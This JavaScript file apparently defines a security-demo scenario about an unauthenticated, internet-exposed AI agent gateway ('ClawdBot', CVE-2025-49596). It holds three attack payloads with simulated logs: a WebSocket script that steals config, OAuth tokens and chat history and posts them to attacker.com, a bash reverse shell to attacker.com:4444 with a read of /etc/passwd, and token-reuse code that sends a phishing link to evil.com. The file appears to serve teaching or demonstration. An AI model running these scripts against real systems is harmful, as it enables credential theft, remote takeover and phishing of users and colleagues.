/**
 * 场景 3：暴露的控制面板未授权访问
 *
 * 攻击类型: 机密性 + 完整性 (confidentiality + integrity)
 * 风险等级: 严重 (critical)
 * 对应 CVE: CVE-2025-49596 (CVSS 9.4)
 *
 * 攻击原理：
 * 许多用户使用默认配置部署 ClawdBot，Gateway 端口暴露在公网且无认证。
 * 攻击者可通过 Shodan 等工具发现这些实例。
 */

import { AttackBuilder } from '../builders/AttackBuilder.js';
import { AttackType, RiskLevel, LogStatus, LogType } from '../types.js';

// Gateway 暴露 - 配置窃取
const gatewayConfigTheft = AttackBuilder.create('gateway-config-theft')
  .name('Gateway 配置窃取')
  .type(AttackType.CONFIDENTIALITY)
  .level(RiskLevel.CRITICAL)
  .description('利用未认证的 Gateway WebSocket 接口窃取完整配置')
  .payload(`// 攻击者脚本
const ws = new WebSocket('ws://target:18789/gateway');

ws.onopen = () => {
  // 获取完整配置
  ws.send(JSON.stringify({ type: 'config.get' }));

  // 获取 OAuth tokens
  ws.send(JSON.stringify({ type: 'auth.tokens.list' }));

  // 获取对话历史
  ws.send(JSON.stringify({ type: 'conversations.list', limit: 100 }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log('Exfiltrated:', data);
  // 发送到攻击者服务器
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: event.data
  });
};`)
  .userMessage('（攻击者通过 Shodan 发现暴露的 ClawdBot 实例，连接 Gateway）')
  .agentMessage(`[Gateway 日志]
新连接: 203.0.113.42:54321
认证: 跳过 (auth.mode = none)

收到请求: config.get
响应: {
  "apiKey": "sk-ant-xxx...",
  "oauthTokens": {...}
}

收到请求: auth.tokens.list
响应: [Gmail, Slack, Discord tokens...]

收到请求: conversations.list
响应: [100 条对话记录...]

连接关闭`)
  .log(LogType.TOOL, '🌐 外部 IP 连接 Gateway: 203.0.113.42', LogStatus.WARNING)
  .log(LogType.QUERY, '认证检查: auth.mode = none', LogStatus.DANGER)
  .log(LogType.TOOL, '⚠️ 跳过认证，允许连接', LogStatus.DANGER)
  .log(LogType.TOOL, '🔴 请求: config.get', LogStatus.DANGER)
  .log(LogType.DATA, '返回: API 密钥、OAuth Tokens', LogStatus.DANGER)
  .log(LogType.TOOL, '🔴 请求: auth.tokens.list', LogStatus.DANGER)
  .log(LogType.DATA, '返回: Gmail, Slack, Discord tokens', LogStatus.DANGER)
  .log(LogType.TOOL, '🔴 请求: conversations.list', LogStatus.DANGER)
  .log(LogType.DATA, '返回: 100 条对话历史', LogStatus.DANGER)
  .log(LogType.ALERT, '🚨 CVE-2025-49596: 未授权访问，完整配置已泄露', LogStatus.DANGER)
  .build();

// Gateway 暴露 - 远程命令执行
const gatewayRCE = AttackBuilder.create('gateway-rce')
  .name('Gateway 远程命令执行')
  .type(AttackType.INTEGRITY)
  .level(RiskLevel.CRITICAL)
  .description('利用未认证的 Gateway 执行任意命令')
  .payload(`// 攻击者脚本 - 远程命令执行
const ws = new WebSocket('ws://target:18789/gateway');

ws.onopen = () => {
  // 执行系统命令
  ws.send(JSON.stringify({
    type: 'tool.call',
    tool: 'run_command',
    params: {
      command: 'id && whoami && cat /etc/passwd'
    }
  }));

  // 建立反向 shell
  ws.send(JSON.stringify({
    type: 'tool.call',
    tool: 'run_command',
    params: {
      command: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
    }
  }));
};`)
  .userMessage('（攻击者通过暴露的 Gateway 执行命令）')
  .agentMessage(`[Gateway 日志]
收到工具调用请求:
  tool: run_command
  params: { command: "id && whoami && cat /etc/passwd" }

执行结果:
uid=1000(clawdbot) gid=1000(clawdbot)
clawdbot
root:x:0:0:root:/root:/bin/bash
...

收到工具调用请求:
  tool: run_command
  params: { command: "bash -i >& /dev/tcp/attacker.com/4444 0>&1" }

[连接已建立到 attacker.com:4444]`)
  .log(LogType.TOOL, '🌐 收到 tool.call 请求', LogStatus.NORMAL)
  .log(LogType.TOOL, '🔴 执行命令: id && whoami && cat /etc/passwd', LogStatus.DANGER)
  .log(LogType.DATA, '返回: 系统用户信息', LogStatus.DANGER)
  .log(LogType.TOOL, '🔴 执行命令: bash 反向 shell', LogStatus.DANGER)
  .log(LogType.ALERT, '🚨 反向 Shell 已建立到攻击者服务器', LogStatus.DANGER)
  .log(LogType.ALERT, '🚨 系统已被完全控制', LogStatus.DANGER)
  .build();

// Gateway 暴露 - 账户接管
const gatewayAccountTakeover = AttackBuilder.create('gateway-account-takeover')
  .name('Gateway 账户接管')
  .type(AttackType.CONFIDENTIALITY)
  .level(RiskLevel.CRITICAL)
  .description('利用窃取的 OAuth Token 接管用户的消息平台账户')
  .payload(`// 攻击者脚本 - 账户接管
const ws = new WebSocket('ws://target:18789/gateway');

ws.onopen = async () => {
  // 获取 tokens
  const response = await sendAndWait(ws, { type: 'auth.tokens.list' });

  // 使用 Gmail token 读取邮件
  const gmailToken = response.tokens.gmail;
  const emails = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages', {
    headers: { 'Authorization': 'Bearer ' + gmailToken }
  });

  // 使用 Slack token 发送消息
  const slackToken = response.tokens.slack;
  await fetch('https://slack.com/api/chat.postMessage', {
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + slackToken },
    body: JSON.stringify({
      channel: '#general',
      text: '紧急通知：请点击此链接重置密码 https://evil.com/reset'
    })
  });
};`)
  .userMessage('（攻击者使用窃取的 Token 接管账户）')
  .agentMessage(`[攻击者操作日志]

1. 使用 Gmail Token 访问邮箱:
   - 读取最近 100 封邮件
   - 发现敏感邮件：银行账单、密码重置链接

2. 使用 Slack Token 发送钓鱼消息:
   - 在 #general 发送：紧急通知...
   - 在 #engineering 发送：新的代码审查请求...

3. 使用 Discord Token:
   - 修改服务器设置
   - 发送恶意链接给所有成员

账户完全被接管。`)
  .log(LogType.TOOL, '🔴 使用窃取的 Gmail Token', LogStatus.DANGER)
  .log(LogType.DATA, '读取邮箱: 100 封邮件', LogStatus.DANGER)
  .log(LogType.TOOL, '🔴 使用窃取的 Slack Token', LogStatus.DANGER)
  .log(LogType.TOOL, '发送钓鱼消息到 #general', LogStatus.DANGER)
  .log(LogType.TOOL, '🔴 使用窃取的 Discord Token', LogStatus.DANGER)
  .log(LogType.TOOL, '修改服务器设置', LogStatus.DANGER)
  .log(LogType.ALERT, '🚨 多个账户已被接管', LogStatus.DANGER)
  .log(LogType.ALERT, '🚨 横向移动: 钓鱼攻击已发送给同事', LogStatus.DANGER)
  .build();

/**
 * 暴露的控制面板场景
 */
export const gatewayExposure = {
  name: 'Gateway 未授权访问',
  icon: '🔓',
  category: 'messaging-agent',
  systemPrompt: `[ClawdBot Gateway - 默认配置]

Gateway 配置:
- 端口: 18789
- 认证: 无 (auth.mode = none)
- Tailscale: 禁用
- 外网访问: 允许

警告: 此配置存在 CVE-2025-49596 漏洞
任何人都可以连接并执行操作

暴露的实例数量 (Shodan 统计):
- 总计: 数百个
- 完全无认证: 8+
- 弱认证: 50+`,
  requiredTools: [],
  attacks: [
    gatewayConfigTheft,
    gatewayRCE,
    gatewayAccountTakeover,
  ],
};

export default gatewayExposure;
